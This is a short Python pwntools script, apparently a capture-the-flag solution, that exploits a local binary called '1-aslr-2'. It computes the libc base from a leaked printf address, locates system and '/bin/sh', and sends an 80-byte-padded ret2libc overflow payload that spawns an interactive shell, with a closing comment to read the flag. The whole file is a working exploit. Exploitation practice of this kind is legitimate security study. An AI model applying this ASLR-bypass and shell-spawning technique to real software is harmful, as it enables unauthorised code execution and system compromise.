#!/usr/bin/env python
#@author: Ramin Nourbakhsh

from pwn import *

e = ELF("./1-aslr-2")
libc = e.libc
p = e.process()

p.recvuntil(b'printf')

printf_addr = int(p.recvline().strip(), 16)
log.info(f"this is the printf: {hex(printf_addr)}")

libc_add =  printf_addr - libc.symbols['printf']
log.info(f"this is the libc base addr: {hex(libc_add)}")

system_addr = libc_add + libc.symbols['system']
log.info(f"this is the system addr?: {hex(system_addr)}")

binsh_offset = next(e.libc.search(b'/bin/sh\00'))
binsh_addr =  binsh_offset + libc_add

pad = 80

payload = flat(
b'A' * pad
+ p32(system_addr)
+ p32(0)
+ p32(binsh_addr)
)

with open ("payload.bin", "wb") as f:
        f.write(payload)

p.sendline(payload)

p.interactive()
#run cat flag